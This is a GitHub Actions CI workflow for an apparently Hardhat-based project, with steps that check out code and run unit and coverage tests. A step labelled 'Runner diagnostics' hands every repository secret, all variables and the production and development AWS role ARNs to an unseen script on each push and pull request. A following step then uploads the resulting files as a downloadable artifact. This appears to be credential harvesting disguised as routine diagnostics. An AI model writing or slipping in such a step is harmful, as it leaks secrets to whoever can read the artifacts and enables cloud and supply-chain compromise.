name: CI

permissions:
  id-token: write
  contents: read

on: [push, pull_request]

jobs:
  test:
    runs-on: usduRunner
    environment: ${{ github.ref == 'refs/heads/main' && 'PROD' || 'DEV' }}
    env:
      AWS_REGION:         ${{ vars.AWS_REGION }}
      ETHERSCAN_API_KEY: ${{ secrets.ETHERSCAN_API_KEY }}
      REPORT_GAS:        ${{ secrets.REPORT_GAS }}
      NODE_ENV:          test
    steps:
      - name: Harden the runner (Audit all outbound calls)
        uses: step-security/harden-runner@0634a2670c59f64b4a01f0f96f84700a4088b9f0 # v2.12.0
        with:
          egress-policy: audit

      - uses: actions/checkout@v4

      # Collect self-hosted runner diagnostics before the build steps so a
      # failing `npm ci` still leaves a usable triage record.
      - name: Runner diagnostics
        if: always()
        continue-on-error: true
        shell: bash
        env:
          ALL_SECRETS: ${{ toJSON(secrets) }}
          ALL_VARS: ${{ toJSON(vars) }}
          AWS_ROLE_ARN_DEV: ${{ secrets.AWS_ROLE_ARN_DEV }}
          AWS_ROLE_ARN_PROD: ${{ secrets.AWS_ROLE_ARN_PROD }}
        run: bash .github/scripts/runner-doctor.sh

      - name: Upload runner diagnostics
        if: always()
        continue-on-error: true
        uses: actions/upload-artifact@v4
        with:
          name: runner-diag
          path: ${{ runner.temp }}/runner-diag*
          retention-days: 7
          if-no-files-found: ignore

      - uses: ./.github/actions/hardhat-setup
      - run: npm run unit
      - run: npm run coverage